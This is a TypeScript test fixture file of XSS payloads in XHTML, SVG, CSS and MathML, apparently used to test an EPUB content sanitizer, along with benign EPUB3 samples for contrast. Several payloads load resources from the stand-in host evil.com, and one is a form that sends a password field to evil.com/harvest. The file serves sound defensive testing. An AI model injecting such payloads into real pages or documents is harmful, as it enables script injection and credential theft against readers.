/**
 * Malicious payload fixtures for adversarial EPUB testing.
 */

export const MALICIOUS_XHTML_PAYLOADS = [
  '<html><body><script>alert("xss")</script><p>Normal text</p></body></html>',
  '<html><body><img src="x" onerror="alert(1)" /><p>Text</p></body></html>',
  '<html><body><iframe src="https://evil.com/phish"></iframe></body></html>',
  '<html><body><object data="javascript:alert(1)"></object></body></html>',
  '<html><body><form action="https://evil.com/harvest"><input name="pass"/></form></body></html>',
  '<html><body><a href="javascript:alert(1)">Click me</a></body></html>',
];

export const MALICIOUS_SVG_PAYLOADS = [
  '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="10" height="10"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><use href="javascript:alert(1)"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.com/vector.svg"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="https://evil.com"></iframe></foreignObject></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><feImage href="javascript:alert(1)"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10" onclick="alert(1)"/></svg>',
];

export const MALICIOUS_CSS_PAYLOADS = [
  'body { background: url("javascript:alert(1)"); }',
  'p { background: url("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="); }',
  '@import url("javascript:alert(1)");',
  '@import url("https://evil.com/tracker.css");',
  'div { width: expression(alert(1)); }',
  'div { -moz-binding: url("http://evil.com/xss.xml#xss"); }',
];

export const MALICIOUS_MATHML_PAYLOADS = [
  '<math xmlns="http://www.w3.org/1998/Math/MathML"><maction actiontype="statusline" xlink:href="javascript:alert(1)"><mtext>Click</mtext></maction></math>',
  '<math xmlns="http://www.w3.org/1998/Math/MathML"><annotation-xml encoding="text/html"><script>alert("mathml-xss")</script></annotation-xml></math>',
  '<math xmlns="http://www.w3.org/1998/Math/MathML" onclick="alert(1)"><mi>x</mi></math>',
];

export const LEGITIMATE_EPUB3_CONTENT = {
  typography: `
    <html>
      <head>
        <style>
          body { font-family: "Georgia", serif; line-height: 1.6; color: #333; }
          h1 { font-size: 2em; margin-bottom: 0.5em; }
          p { margin-bottom: 1em; }
        </style>
      </head>
      <body>
        <h1>Chapter 1: The Beginning</h1>
        <p>This is standard EPUB3 text with regular typography and styled paragraphs.</p>
      </body>
    </html>
  `,
  illustration: `
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <defs>
        <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="0%">
          <stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:1" />
          <stop offset="100%" style="stop-color:rgb(255,0,0);stop-opacity:1" />
        </linearGradient>
      </defs>
      <circle cx="50" cy="50" r="40" fill="url(#grad1)" />
    </svg>
  `,
  formula: `
    <math xmlns="http://www.w3.org/1998/Math/MathML">
      <mrow>
        <mi>a</mi>
        <mo>&#x2062;</mo>
        <msup>
          <mi>x</mi>
          <mn>2</mn>
        </msup>
        <mo>+</mo>
        <mi>b</mi>
        <mo>&#x2062;</mo>
        <mi>x</mi>
        <mo>+</mo>
        <mi>c</mi>
      </mrow>
    </math>
  `,
};
